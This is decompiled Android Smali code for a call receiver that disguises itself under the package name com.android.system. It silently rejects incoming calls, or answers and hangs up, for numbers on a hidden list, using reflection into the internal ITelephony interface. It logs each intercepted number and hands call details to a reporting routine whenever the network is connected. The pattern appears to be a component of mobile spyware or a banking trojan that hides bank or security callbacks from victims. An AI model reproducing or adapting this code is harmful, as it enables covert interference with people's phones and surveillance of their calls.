.class public Lcom/android/system/iCall;
.super Landroid/content/BroadcastReceiver;
.source "iCall.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 17
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private NetFo(Landroid/content/Context;)Landroid/net/NetworkInfo;
    .locals 3
    .param p1, "Z"    # Landroid/content/Context;

    .prologue
    .line 147
    const-string v2, "connectivity"

    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 148
    .local v0, "cm":Landroid/net/ConnectivityManager;
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v1

    .line 149
    .local v1, "netInfo":Landroid/net/NetworkInfo;
    return-object v1
.end method

.method private Prepare(Ljava/lang/String;)Ljava/lang/String;
    .locals 2
    .param p1, "phoneZ"    # Ljava/lang/String;

    .prologue
    .line 136
    const-string v0, "+"

    const-string v1, ""

    invoke-virtual {p1, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private collectData(Ljava/lang/String;Landroid/content/Intent;)Ljava/lang/String;
    .locals 1
    .param p1, "extraState"    # Ljava/lang/String;
    .param p2, "i"    # Landroid/content/Intent;

    .prologue
    .line 141
    invoke-virtual {p2, p1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 27
    .param p1, "c"    # Landroid/content/Context;
    .param p2, "i"    # Landroid/content/Intent;

    .prologue
    .line 23
    move-object/from16 v19, p1

    .line 26
    .local v19, "Z":Landroid/content/Context;
    const-string v2, "phone"

    move-object/from16 v0, v19

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v24

    check-cast v24, Landroid/telephony/TelephonyManager;

    .line 28
    .local v24, "tm":Landroid/telephony/TelephonyManager;
    const-string v2, "state"

    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v2, v1}, Lcom/android/system/iCall;->collectData(Ljava/lang/String;Landroid/content/Intent;)Ljava/lang/String;

    move-result-object v17

    .line 30
    .local v17, "State":Ljava/lang/String;
    const-string v2, "incoming_number"

    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v2, v1}, Lcom/android/system/iCall;->collectData(Ljava/lang/String;Landroid/content/Intent;)Ljava/lang/String;

    move-result-object v10

    .line 33
    .local v10, "Phone":Ljava/lang/String;
    const/16 v21, 0x0

    .line 34
    .local v21, "f":Z
    const-string v16, ""

    .line 35
    .local v16, "Report":Ljava/lang/String;
    const-string v5, ""

    .line 43
    .local v5, "PhoneK":Ljava/lang/String;
    :try_start_0
    invoke-virtual/range {v24 .. v24}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v13

    .line 44
    .local v13, "CC":Ljava/lang/Class;
    const-string v2, "getITelephony"

    const/4 v3, 0x0

    new-array v3, v3, [Ljava/lang/Class;

    invoke-virtual {v13, v2, v3}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v22

    .line 45
    .local v22, "m":Ljava/lang/reflect/Method;
    const/4 v2, 0x1

    move-object/from16 v0, v22

    invoke-virtual {v0, v2}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 47
    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Object;

    move-object/from16 v0, v22

    move-object/from16 v1, v24

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v18

    check-cast v18, Lcom/android/internal/telephony/ITelephony;

    .line 48
    .local v18, "TS":Lcom/android/internal/telephony/ITelephony;
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v12

    .line 49
    .local v12, "Bundle":Landroid/os/Bundle;
    const-string v2, "incoming_number"

    invoke-virtual {v12, v2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 51
    .local v15, "PhoneZ":Ljava/lang/String;
    if-eqz v15, :cond_2

    .line 53
    move-object/from16 v0, p0

    invoke-direct {v0, v15}, Lcom/android/system/iCall;->Prepare(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 55
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "i"

    move-object/from16 v0, p1

    invoke-virtual {v2, v3, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v14

    .line 57
    .local v14, "Lock":Ljava/lang/String;
    const-string v2, "*"

    invoke-virtual {v14, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_0

    if-nez v21, :cond_0

    .line 58
    const/16 v21, 0x1

    .line 59
    const-string v2, "Rejected inc"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "oming call / Scheme: *\rNumber: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    .line 60
    invoke-interface/range {v18 .. v18}, Lcom/android/internal/telephony/ITelephony;->endCall()Z

    .line 64
    :cond_0
    const-string v2, ","

    invoke-virtual {v14, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_1

    if-nez v21, :cond_1

    .line 66
    const-string v2, ","

    invoke-virtual {v14, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v26

    .line 68
    .local v26, "zLock":[Ljava/lang/String;
    const/16 v25, 0x0

    .local v25, "z":I
    :goto_0
    move-object/from16 v0, v26

    array-length v2, v0

    move/from16 v0, v25

    if-lt v0, v2, :cond_5

    .line 82
    .end local v25    # "z":I
    .end local v26    # "zLock":[Ljava/lang/String;
    :cond_1
    invoke-virtual {v15, v14}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_2

    if-nez v21, :cond_2

    .line 83
    const/16 v21, 0x1

    .line 84
    const-string v2, "Rejected inc"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "oming call / Scheme: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "\nPhone:"

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v14, v4}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    .line 85
    invoke-interface/range {v18 .. v18}, Lcom/android/internal/telephony/ITelephony;->answerRingingCall()V

    .line 86
    invoke-interface/range {v18 .. v18}, Lcom/android/internal/telephony/ITelephony;->endCall()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 101
    .end local v12    # "Bundle":Landroid/os/Bundle;
    .end local v13    # "CC":Ljava/lang/Class;
    .end local v14    # "Lock":Ljava/lang/String;
    .end local v15    # "PhoneZ":Ljava/lang/String;
    .end local v18    # "TS":Lcom/android/internal/telephony/ITelephony;
    .end local v22    # "m":Ljava/lang/reflect/Method;
    :cond_2
    :goto_1
    if-eqz v21, :cond_3

    const-string v2, "RINGING"

    move-object/from16 v0, v17

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_3

    .line 102
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    move-object/from16 v0, v16

    move-object/from16 v1, p1

    invoke-virtual {v2, v5, v0, v1}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 103
    new-instance v2, Lcom/android/system/Report;

    invoke-direct {v2}, Lcom/android/system/Report;-><init>()V

    const-string v3, "null"

    .line 104
    const-string v4, "in_block"

    move-object v6, v5

    move-object/from16 v7, p1

    .line 103
    invoke-virtual/range {v2 .. v7}, Lcom/android/system/Report;->Av(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 112
    :cond_3
    if-eqz v10, :cond_4

    if-nez v21, :cond_4

    const-string v2, "RINGING"

    move-object/from16 v0, v17

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_4

    .line 114
    const/16 v21, 0x1

    .line 115
    const-string v2, "+"

    const-string v3, ""

    invoke-virtual {v10, v2, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v9

    .line 117
    .local v9, "ZPhone":Ljava/lang/String;
    move-object/from16 v0, p0

    move-object/from16 v1, v19

    invoke-direct {v0, v1}, Lcom/android/system/iCall;->NetFo(Landroid/content/Context;)Landroid/net/NetworkInfo;

    move-result-object v23

    .line 119
    .local v23, "netInfo":Landroid/net/NetworkInfo;
    if-eqz v23, :cond_4

    invoke-virtual/range {v23 .. v23}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v2

    if-eqz v2, :cond_4

    .line 120
    const-string v2, "in!call"

    const-string v3, "!"

    const-string v4, "_"

    invoke-virtual {v2, v3, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v8

    .line 121
    .local v8, "report_type":Ljava/lang/String;
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    move-object/from16 v0, p1

    invoke-virtual {v2, v9, v10, v0}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 122
    new-instance v6, Lcom/android/system/Report;

    invoke-direct {v6}, Lcom/android/system/Report;-><init>()V

    const-string v7, "null"

    move-object/from16 v11, p1

    invoke-virtual/range {v6 .. v11}, Lcom/android/system/Report;->Av(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 131
    .end local v8    # "report_type":Ljava/lang/String;
    .end local v9    # "ZPhone":Ljava/lang/String;
    .end local v23    # "netInfo":Landroid/net/NetworkInfo;
    :cond_4
    return-void

    .line 69
    .restart local v12    # "Bundle":Landroid/os/Bundle;
    .restart local v13    # "CC":Ljava/lang/Class;
    .restart local v14    # "Lock":Ljava/lang/String;
    .restart local v15    # "PhoneZ":Ljava/lang/String;
    .restart local v18    # "TS":Lcom/android/internal/telephony/ITelephony;
    .restart local v22    # "m":Ljava/lang/reflect/Method;
    .restart local v25    # "z":I
    .restart local v26    # "zLock":[Ljava/lang/String;
    :cond_5
    :try_start_1
    aget-object v2, v26, v25

    invoke-virtual {v15, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_6

    .line 71
    const/16 v21, 0x1

    .line 72
    const-string v2, "Reject"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "ed incoming call / Scheme: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "\nPhone:"

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v14, v4}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    .line 73
    invoke-interface/range {v18 .. v18}, Lcom/android/internal/telephony/ITelephony;->answerRingingCall()V

    .line 74
    invoke-interface/range {v18 .. v18}, Lcom/android/internal/telephony/ITelephony;->endCall()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 68
    :cond_6
    add-int/lit8 v25, v25, 0x1

    goto/16 :goto_0

    .line 95
    .end local v12    # "Bundle":Landroid/os/Bundle;
    .end local v13    # "CC":Ljava/lang/Class;
    .end local v14    # "Lock":Ljava/lang/String;
    .end local v15    # "PhoneZ":Ljava/lang/String;
    .end local v18    # "TS":Lcom/android/internal/telephony/ITelephony;
    .end local v22    # "m":Ljava/lang/reflect/Method;
    .end local v25    # "z":I
    .end local v26    # "zLock":[Ljava/lang/String;
    :catch_0
    move-exception v20

    .line 96
    .local v20, "e":Ljava/lang/Exception;
    invoke-virtual/range {v20 .. v20}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_1
.end method
